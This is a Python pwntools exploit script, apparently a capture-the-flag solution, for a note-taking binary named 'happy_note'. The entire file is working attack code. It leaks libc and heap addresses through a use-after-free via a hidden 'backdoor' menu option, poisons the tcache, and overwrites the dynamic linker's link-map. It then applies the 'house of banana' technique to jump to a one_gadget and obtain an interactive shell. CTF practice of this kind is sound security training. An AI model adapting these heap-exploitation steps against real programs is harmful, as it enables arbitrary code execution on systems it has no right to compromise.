from pwn import *

context(log_level='debug',os='linux',arch='amd64')
p = process(["./ld-2.34.so","./happy_note"],env={"LD_PRELOAD":"./libc.so.6"})
#p = process(["/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2","./happy_note"],env={"LD_PRELOAD":"/usr/lib/x86_64-linux-gnu/libc.so.6"})
elf = ELF('happy_note')
#libc = ELF('libc.so.6')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
one = [0xeacec,0xeacef,0xeacf2]

menu = b'>> '
def add(idx,size,t):
	p.sendlineafter(menu,b'1')
	p.sendlineafter(b'size:',str(size).encode())
	p.sendlineafter(b'note:',str(idx).encode())
	p.sendlineafter(b'[2]',str(t).encode())
def delete(idx):
    p.sendlineafter(menu,b'2')
    p.sendlineafter(b'note:',str(idx).encode())
def show(idx):
    p.sendlineafter(menu,b'3')
    p.sendlineafter(b'show?',str(idx).encode())   
def edit(idx,content):
    p.sendlineafter(menu,b'4')
    p.sendlineafter(b'note:',str(idx).encode())
    p.sendafter(b'content',content) 
def backdoor(idx):
	p.sendlineafter(menu,b'666')
	p.sendlineafter(b'note:',str(idx).encode())

[add(x,0x200,1) for x in range(8)]	#0-7
add(8,0x1e0,1)	#8

#leak libc
[delete(x) for x in range(7)]
backdoor(7)
show(7)
libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))-0x219cc0
#libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))-0x219ce0
padding = libc_base + 0x218bc0
l_next = libc_base + 0x228088 - 0x8
rtl_global = libc_base + 0x266040
one_gadget = libc_base + one[0]
print('libc_base',hex(libc_base))
print('l_next',hex(l_next))

#leak tcache_key
add(9,0x10,1)	#7,idx=9
delete(9)
show(7)
p.recvuntil(b'content: ')
key = u64(p.recv(5).ljust(8,b'\x00'))
heap = (key<<12)+0x500
print('key',hex(key))
print('heap',hex(heap))

#gdb.attach(p,'b calloc\nc')
#tcache poisoning
add(10,0x1e0,1)	#7,idx=10
delete(8)
delete(10)
edit(7,b'a'*0x10+p64(0)+p64(0x1f1)+p64(key^l_next))
add(10,0x1e0,2)	#7,idx=10
add(11,0x1e0,2)	#target
edit(11,p64(padding)+p64(heap))

#gdb.attach(p,'b calloc\nb free\nb *'+str(hex(one_gadget))+'\nc')
#house of banana
add(1,0x1f8,1)
add(2,0x1f8,1)
payload = b'\x00'*0x18
payload += p64(heap)
payload = payload.ljust(0x38,b'\x00')
payload += p64(heap+0x58)
payload += p64(0x8)
payload += p64(one_gadget)
payload = payload.ljust(0x100,b'\x00')
payload += p64(heap+0x40)
payload += p64(0)
payload += p64(heap+0x48)
payload = payload.ljust(0x1f8,b'\x00')
edit(1,payload)
payload = b'\x00'*(0x31c-0x10-0x200)+p8(0x9)
edit(2,payload)
#exit
delete(3)

p.interactive()
p.close()
